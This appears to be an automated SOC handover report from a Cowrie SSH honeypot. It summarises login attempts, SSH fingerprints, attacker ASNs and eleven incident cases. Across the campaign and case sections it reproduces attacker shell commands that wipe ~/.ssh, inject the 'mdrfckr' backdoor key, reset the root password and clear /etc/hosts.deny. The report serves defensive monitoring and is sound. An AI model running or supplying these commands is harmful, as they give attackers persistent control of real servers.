# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-31 |
| **Generated At** | 2026-05-31T11:43:24Z |
| **Shift Time** | 11:43 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **237** |
| Confirmed Threats | **233** |
| False Positives Filtered | **4** (1.7%) |
| Unique Attacker IPs | **28** |
| Countries of Origin | **11** |
| High Severity Cases | **11** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **226** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **30** |
| Unique Credential Pairs | **21** |
| Unique Usernames | **13** |
| Unique Passwords | **20** |
| Successful Auth Pairs | **9** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 13 |
| `345gs5662d34` | 5 |
| `ubuntu` | 2 |
| `h` | 1 |
| `free` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 5 |
| `3245gs5662d34` | 5 |
| `` | 2 |
| `1` | 2 |
| `h` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 5 |
| `root` | `3245gs5662d34` | 5 |
| `root` | `` | 2 |
| `h` | `h` | 1 |
| `free` | `1` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `QWE123!@#qwe` | `43.173.69.147` | 2026-05-31T09:02:51 |
| `root` | `3245gs5662d34` | `43.173.69.147` | 2026-05-31T09:02:57 |
| `root` | `Support@2025` | `40.83.182.122` | 2026-05-31T10:05:41 |
| `root` | `3245gs5662d34` | `40.83.182.122` | 2026-05-31T10:05:46 |
| `root` | `yusuf` | `40.83.182.122` | 2026-05-31T10:09:09 |
| `root` | `rootpasswd` | `203.189.221.17` | 2026-05-31T10:09:39 |
| `root` | `3245gs5662d34` | `203.189.221.17` | 2026-05-31T10:09:43 |
| `root` | `P@ssw0rd!` | `40.83.182.122` | 2026-05-31T10:14:25 |
| `root` | `Hello1234` | `119.96.193.72` | 2026-05-31T10:16:09 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **237** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 39 |
| Paramiko (Python) | 8 |
| Go SSH scanner | 4 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 34 | 7 |
| `87e3d9ffee05...` | Mirai/variant | 8 | 1 |
| `03a80b21afa8...` | Modern SSH client | 2 | 2 |
| `f1e5e9d24e5e...` | Mirai/variant | 1 | 1 |
| `16443846184e...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 34 | 7 | Mirai/variant |
| `87e3d9ffee05...` | Paramiko (Python) | 8 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 2 | 2 | — |
| `03a80b21afa8...` | libssh | 2 | 2 | Modern SSH client |
| `f1e5e9d24e5e...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `e37f354a101a...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:QGPDVUtlu7sG"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `119.96.193.72`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `203.189.221.17`, `40.83.182.122`, `43.173.69.147`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **28** |
| Unique ASNs | **23** |
| High-Risk ASNs | **20** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS398324` | Censys, Inc. | 2 | HIGH |
| `AS16509` | Amazon.com, Inc. | 2 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS680` | Verein zur Foerderung eines Deutschen Forschungsnetzes e.V. | 1 | HIGH |
| `AS132203` | Tencent Building, Kejizhongyi Avenue | 1 | HIGH |
| `AS2614` | RoEduNet | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (11)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-eb8a255a8c33

| Field | Detail |
|---|---|
| **Source IP** | `43.173.69[.]147` |
| **First Seen** | 2026-05-31 09:02 |
| **Last Seen** | 2026-05-31 09:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 09:02:50` | `cowrie.session.connect` |
| `2026-05-31 09:02:50` | `cowrie.client.version` |
| `2026-05-31 09:02:50` | `cowrie.client.kex` |
| `2026-05-31 09:02:51` | `cowrie.login.success` |
| `2026-05-31 09:02:51` | `cowrie.session.params` |
| `2026-05-31 09:02:51` | `cowrie.command.input` |
| `2026-05-31 09:02:51` | `cowrie.command.failed` |
| `2026-05-31 09:02:52` | `cowrie.log.closed` |
| `2026-05-31 09:02:52` | `cowrie.session.params` |
| `2026-05-31 09:02:52` | `cowrie.command.input` |
| `2026-05-31 09:02:53` | `cowrie.session.file_download` |
| `2026-05-31 09:02:53` | `cowrie.log.closed` |
| `2026-05-31 09:02:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.173.69[.]147` to AbuseIPDB if not already reported
- [ ] Block `43.173.69[.]147` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-316994425688

| Field | Detail |
|---|---|
| **Source IP** | `43.173.69[.]147` |
| **First Seen** | 2026-05-31 09:02 |
| **Last Seen** | 2026-05-31 09:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 09:02:56` | `cowrie.session.connect` |
| `2026-05-31 09:02:56` | `cowrie.client.version` |
| `2026-05-31 09:02:56` | `cowrie.client.kex` |
| `2026-05-31 09:02:57` | `cowrie.login.success` |
| `2026-05-31 09:02:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.173.69[.]147` to AbuseIPDB if not already reported
- [ ] Block `43.173.69[.]147` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8666ad56c8a0

| Field | Detail |
|---|---|
| **Source IP** | `40.83.182[.]122` |
| **First Seen** | 2026-05-31 10:05 |
| **Last Seen** | 2026-05-31 10:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 10:05:40` | `cowrie.session.connect` |
| `2026-05-31 10:05:40` | `cowrie.client.version` |
| `2026-05-31 10:05:40` | `cowrie.client.kex` |
| `2026-05-31 10:05:41` | `cowrie.login.success` |
| `2026-05-31 10:05:41` | `cowrie.session.params` |
| `2026-05-31 10:05:41` | `cowrie.command.input` |
| `2026-05-31 10:05:41` | `cowrie.command.failed` |
| `2026-05-31 10:05:42` | `cowrie.log.closed` |
| `2026-05-31 10:05:42` | `cowrie.session.params` |
| `2026-05-31 10:05:42` | `cowrie.command.input` |
| `2026-05-31 10:05:42` | `cowrie.session.file_download` |
| `2026-05-31 10:05:42` | `cowrie.log.closed` |
| `2026-05-31 10:05:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.83.182[.]122` to AbuseIPDB if not already reported
- [ ] Block `40.83.182[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36ddc4b6b674

| Field | Detail |
|---|---|
| **Source IP** | `40.83.182[.]122` |
| **First Seen** | 2026-05-31 10:05 |
| **Last Seen** | 2026-05-31 10:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 10:05:45` | `cowrie.session.connect` |
| `2026-05-31 10:05:45` | `cowrie.client.version` |
| `2026-05-31 10:05:45` | `cowrie.client.kex` |
| `2026-05-31 10:05:46` | `cowrie.login.success` |
| `2026-05-31 10:05:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.83.182[.]122` to AbuseIPDB if not already reported
- [ ] Block `40.83.182[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87f58d06cd89

| Field | Detail |
|---|---|
| **Source IP** | `40.83.182[.]122` |
| **First Seen** | 2026-05-31 10:09 |
| **Last Seen** | 2026-05-31 10:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 10:09:07` | `cowrie.session.connect` |
| `2026-05-31 10:09:07` | `cowrie.client.version` |
| `2026-05-31 10:09:08` | `cowrie.client.kex` |
| `2026-05-31 10:09:09` | `cowrie.login.success` |
| `2026-05-31 10:09:09` | `cowrie.session.params` |
| `2026-05-31 10:09:09` | `cowrie.command.input` |
| `2026-05-31 10:09:09` | `cowrie.command.failed` |
| `2026-05-31 10:09:10` | `cowrie.log.closed` |
| `2026-05-31 10:09:10` | `cowrie.session.params` |
| `2026-05-31 10:09:10` | `cowrie.command.input` |
| `2026-05-31 10:09:10` | `cowrie.session.file_download` |
| `2026-05-31 10:09:10` | `cowrie.log.closed` |
| `2026-05-31 10:09:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.83.182[.]122` to AbuseIPDB if not already reported
- [ ] Block `40.83.182[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a01a118150cb

| Field | Detail |
|---|---|
| **Source IP** | `40.83.182[.]122` |
| **First Seen** | 2026-05-31 10:09 |
| **Last Seen** | 2026-05-31 10:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 10:09:13` | `cowrie.session.connect` |
| `2026-05-31 10:09:13` | `cowrie.client.version` |
| `2026-05-31 10:09:13` | `cowrie.client.kex` |
| `2026-05-31 10:09:14` | `cowrie.login.success` |
| `2026-05-31 10:09:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.83.182[.]122` to AbuseIPDB if not already reported
- [ ] Block `40.83.182[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e8c2bf186c1

| Field | Detail |
|---|---|
| **Source IP** | `203.189.221[.]17` |
| **First Seen** | 2026-05-31 10:09 |
| **Last Seen** | 2026-05-31 10:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 10:09:39` | `cowrie.session.connect` |
| `2026-05-31 10:09:39` | `cowrie.client.version` |
| `2026-05-31 10:09:39` | `cowrie.client.kex` |
| `2026-05-31 10:09:39` | `cowrie.login.success` |
| `2026-05-31 10:09:39` | `cowrie.session.params` |
| `2026-05-31 10:09:39` | `cowrie.command.input` |
| `2026-05-31 10:09:39` | `cowrie.command.failed` |
| `2026-05-31 10:09:40` | `cowrie.log.closed` |
| `2026-05-31 10:09:40` | `cowrie.session.params` |
| `2026-05-31 10:09:40` | `cowrie.command.input` |
| `2026-05-31 10:09:40` | `cowrie.session.file_download` |
| `2026-05-31 10:09:40` | `cowrie.log.closed` |
| `2026-05-31 10:09:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.189.221[.]17` to AbuseIPDB if not already reported
- [ ] Block `203.189.221[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14a21b86ee32

| Field | Detail |
|---|---|
| **Source IP** | `203.189.221[.]17` |
| **First Seen** | 2026-05-31 10:09 |
| **Last Seen** | 2026-05-31 10:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 10:09:42` | `cowrie.session.connect` |
| `2026-05-31 10:09:42` | `cowrie.client.version` |
| `2026-05-31 10:09:42` | `cowrie.client.kex` |
| `2026-05-31 10:09:43` | `cowrie.login.success` |
| `2026-05-31 10:09:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.189.221[.]17` to AbuseIPDB if not already reported
- [ ] Block `203.189.221[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd1c8812d526

| Field | Detail |
|---|---|
| **Source IP** | `40.83.182[.]122` |
| **First Seen** | 2026-05-31 10:14 |
| **Last Seen** | 2026-05-31 10:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 10:14:24` | `cowrie.session.connect` |
| `2026-05-31 10:14:24` | `cowrie.client.version` |
| `2026-05-31 10:14:24` | `cowrie.client.kex` |
| `2026-05-31 10:14:25` | `cowrie.login.success` |
| `2026-05-31 10:14:26` | `cowrie.session.params` |
| `2026-05-31 10:14:26` | `cowrie.command.input` |
| `2026-05-31 10:14:26` | `cowrie.command.failed` |
| `2026-05-31 10:14:26` | `cowrie.log.closed` |
| `2026-05-31 10:14:27` | `cowrie.session.params` |
| `2026-05-31 10:14:27` | `cowrie.command.input` |
| `2026-05-31 10:14:27` | `cowrie.session.file_download` |
| `2026-05-31 10:14:27` | `cowrie.log.closed` |
| `2026-05-31 10:14:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.83.182[.]122` to AbuseIPDB if not already reported
- [ ] Block `40.83.182[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd3727cc5890

| Field | Detail |
|---|---|
| **Source IP** | `40.83.182[.]122` |
| **First Seen** | 2026-05-31 10:14 |
| **Last Seen** | 2026-05-31 10:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 10:14:30` | `cowrie.session.connect` |
| `2026-05-31 10:14:30` | `cowrie.client.version` |
| `2026-05-31 10:14:30` | `cowrie.client.kex` |
| `2026-05-31 10:14:31` | `cowrie.login.success` |
| `2026-05-31 10:14:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.83.182[.]122` to AbuseIPDB if not already reported
- [ ] Block `40.83.182[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-508adc15d7c1

| Field | Detail |
|---|---|
| **Source IP** | `119.96.193[.]72` |
| **First Seen** | 2026-05-31 10:16 |
| **Last Seen** | 2026-05-31 10:16 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:QGPDVUtlu7sG"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 10:16:08` | `cowrie.session.connect` |
| `2026-05-31 10:16:08` | `cowrie.client.version` |
| `2026-05-31 10:16:08` | `cowrie.client.kex` |
| `2026-05-31 10:16:09` | `cowrie.login.success` |
| `2026-05-31 10:16:09` | `cowrie.session.params` |
| `2026-05-31 10:16:09` | `cowrie.command.input` |
| `2026-05-31 10:16:09` | `cowrie.command.failed` |
| `2026-05-31 10:16:09` | `cowrie.log.closed` |
| `2026-05-31 10:16:09` | `cowrie.session.params` |
| `2026-05-31 10:16:09` | `cowrie.command.input` |
| `2026-05-31 10:16:10` | `cowrie.session.file_download` |
| `2026-05-31 10:16:10` | `cowrie.log.closed` |
| `2026-05-31 10:16:26` | `cowrie.session.params` |
| `2026-05-31 10:16:26` | `cowrie.command.input` |
| `2026-05-31 10:16:27` | `cowrie.log.closed` |
| `2026-05-31 10:16:27` | `cowrie.session.params` |
| `2026-05-31 10:16:27` | `cowrie.command.input` |
| `2026-05-31 10:16:27` | `cowrie.log.closed` |
| `2026-05-31 10:16:27` | `cowrie.session.params` |
| `2026-05-31 10:16:27` | `cowrie.command.input` |
| `2026-05-31 10:16:28` | `cowrie.session.file_download` |
| `2026-05-31 10:16:28` | `cowrie.log.closed` |
| `2026-05-31 10:16:28` | `cowrie.session.params` |
| `2026-05-31 10:16:28` | `cowrie.command.input` |
| `2026-05-31 10:16:28` | `cowrie.log.closed` |
| `2026-05-31 10:16:28` | `cowrie.session.params` |
| `2026-05-31 10:16:28` | `cowrie.command.input` |
| `2026-05-31 10:16:29` | `cowrie.log.closed` |
| `2026-05-31 10:16:29` | `cowrie.session.params` |
| `2026-05-31 10:16:29` | `cowrie.command.input` |
| `2026-05-31 10:16:29` | `cowrie.command.input` |
| `2026-05-31 10:16:29` | `cowrie.log.closed` |
| `2026-05-31 10:16:30` | `cowrie.session.params` |
| `2026-05-31 10:16:30` | `cowrie.command.input` |
| `2026-05-31 10:16:30` | `cowrie.log.closed` |
| `2026-05-31 10:16:30` | `cowrie.session.params` |
| `2026-05-31 10:16:30` | `cowrie.command.input` |
| `2026-05-31 10:16:30` | `cowrie.log.closed` |
| `2026-05-31 10:16:31` | `cowrie.session.params` |
| `2026-05-31 10:16:31` | `cowrie.command.input` |
| `2026-05-31 10:16:31` | `cowrie.log.closed` |
